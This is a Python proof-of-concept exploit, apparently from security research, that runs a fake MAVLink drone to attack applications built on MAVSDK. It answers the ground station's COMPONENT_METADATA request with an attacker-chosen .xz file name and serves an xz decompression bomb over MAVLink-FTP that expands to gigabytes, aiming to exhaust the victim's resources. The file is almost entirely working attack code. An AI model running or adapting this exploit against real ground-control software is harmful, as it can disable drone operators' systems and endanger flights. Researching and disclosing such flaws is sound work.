"""MAVSDK-03 sink probe: COMPONENT_METADATA (msg 397) .xz, with NO Camera plugin.

Reuses the MAVSDK-03 harness class. The victim app's whole body is
mavsdk::Events{system}, which calls request_autopilot_component() in init()
(events_impl.cpp:56 on main, :50 on v3.17.4), so MAVSDK asks for
COMPONENT_METADATA by itself. The uri names a .xz, and
mavlink_component_metadata.cpp builds the local path from the uri's own
basename, so the extension is the attacker's to choose.
"""
import argparse, sys, time
sys.path.insert(0, "/poc")
import poc
from pymavlink import mavutil


class MetaVehicle(poc.FakeVehicle):
    def __init__(self, *a, **kw):
        self.meta_uri = kw.pop("meta_uri")
        super().__init__(*a, **kw)
        self.answered = 0
        self.ftp_reqs = 0

    def _extra_rx_hook(self, msg, t):
        if t == "FILE_TRANSFER_PROTOCOL":
            self.ftp_reqs += 1
            if self.ftp_reqs % 250 == 0:
                poc.attack("MAVFTP: served %d chunks" % self.ftp_reqs)
            return False
        if t not in ("COMMAND_LONG", "COMMAND_INT"):
            return False
        c = getattr(msg, "command", None)
        want = int(getattr(msg, "param1", 0) or 0)
        if c == 512 and want == 397:
            poc.observe("MAVSDK requested COMPONENT_METADATA (397) via cmd=512 "
                        "-- the app only created mavsdk::Events")
            self.master.mav.command_ack_send(c, mavutil.mavlink.MAV_RESULT_ACCEPTED)
            self.send_component_metadata(self.meta_uri)
            self.answered += 1
            poc.attack("answered COMPONENT_METADATA #%d uri=%r" % (self.answered, self.meta_uri))
            return True
        if c == 512:
            poc.observe("MAVSDK requested message id %d" % want)
        return False


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--listen", default="0.0.0.0:5760")
    ap.add_argument("--gib", type=int, default=1)
    ap.add_argument("--name", default="meta.json.xz")
    ap.add_argument("--bomb-cache", default="/work/bomb.xz")
    a = ap.parse_args()

    poc.banner("MAVSDK-03 sink probe: COMPONENT_METADATA -> InflateLZMA")
    blob = poc.build_bomb_xz(output_gib=a.gib, cache_path=a.bomb_cache)
    poc.ok("bomb is %s bytes on the wire -> %d GiB decompressed" % (format(len(blob), ","), a.gib))

    v = MetaVehicle("tcpin:" + a.listen, verbose=False, meta_uri="mftp://" + a.name)
    v.add_ftp_file(a.name, blob)
    poc.observe("serving %r over MAVLink-FTP; COMPONENT_METADATA.uri = %r"
                % (a.name, v.meta_uri))
    v.start()
    poc.observe("waiting for the GCS")
    v.serve_forever()


if __name__ == "__main__":
    sys.exit(main())
